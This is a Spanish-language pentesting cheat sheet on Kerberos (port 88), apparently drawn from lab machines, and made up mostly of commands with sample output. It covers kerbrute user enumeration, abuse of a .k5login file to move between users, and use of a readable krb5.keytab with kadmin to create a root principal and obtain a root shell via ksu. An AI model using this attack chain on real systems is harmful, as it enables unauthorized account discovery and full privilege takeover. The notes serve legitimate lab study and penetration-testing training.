# Kerberos - 88

## Enumeración de usuarios
```null
kerbrute userenum --dc 10.10.11.175 -d outdated.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

## Configuración del ``krb5.conf`` para el acceso por SSH
```null
dpkg-reconfigure krb5-config
```

```null
[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }
```

El SPN debe ser el primer host al que apuntar en el ``/etc/hosts``

### Conexión
```null
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

```null
ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jan 19 12:36:51 2023 from 10.10.14.6
[j.nakazawa@srv01 ~]$ 
```

## Abuso de ``.krlogin`` para escalar privilegios (LINUX)

### Creación de archivo de configuración en el directorio personal de un usuario
Con esto se consigue que el usuario pwneado se pueda conectar como este otro proporcionando su TGT
```null
[j.nakazawa@srv01 squid]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

### Abuso de ``.keytab``

### Enumeración de TGTs proporcionado este archivo
```null
[admin@srv01 /]$ klist -k /etc/krb5.keytab
```

### Sesión interactiva proporcionando SPN
```null
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

### Creación de principal para el usuario ``root``, así como su contraseña
```null
kadmin:  add_principal root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
```

### Shell como ``root``

```null
[admin@srv01 /]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
```

